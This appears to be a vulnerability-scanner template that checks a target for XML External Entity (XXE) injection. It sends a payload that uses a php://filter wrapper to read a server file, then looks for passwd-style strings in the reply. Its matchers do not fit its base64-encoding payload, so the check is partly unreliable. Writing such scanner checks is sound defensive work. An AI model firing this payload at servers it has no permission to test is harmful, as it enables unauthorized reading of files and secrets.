id: xxe2-068
name: 'XXE file read in body'
severity: critical
type: active
tags:
  - xxe
  - injection
  - xml
description: 'XXE entity via body'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      body:
        - '<!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index">]><r>&xxe;</r>'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
          - 'XXE_OK'
          - 'localhost'
          - 'uid='
